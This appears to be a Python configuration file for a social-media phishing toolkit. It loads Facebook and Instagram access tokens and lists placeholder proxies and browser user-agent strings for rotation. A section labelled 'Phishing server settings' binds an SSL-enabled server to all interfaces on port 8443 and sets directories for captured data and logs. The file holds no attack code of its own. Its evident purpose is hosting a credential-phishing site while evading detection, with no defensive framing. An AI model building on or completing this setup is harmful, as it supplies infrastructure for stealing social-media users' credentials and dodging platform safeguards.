import os
from dotenv import load_dotenv

load_dotenv()

# API Keys (set in .env or environment)
FACEBOOK_ACCESS_TOKEN = os.getenv('FB_TOKEN', '')
INSTAGRAM_ACCESS_TOKEN = os.getenv('IG_TOKEN', '')

# Proxy configuration (format: protocol://user:pass@host:port)
PROXY_LIST = [
    'socks5://user:pass@proxy1:1080',
    'http://user:pass@proxy2:3128',
    # Add more
]

# User agents for rotation
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    # ...
]

# Phishing server settings
PHISH_HOST = '0.0.0.0'
PHISH_PORT = 8443
PHISH_USE_SSL = True
SSL_CERT = 'ssl/cert.pem'
SSL_KEY = 'ssl/key.pem'

# Output directories
DATA_DIR = 'data'
LOG_DIR = 'logs'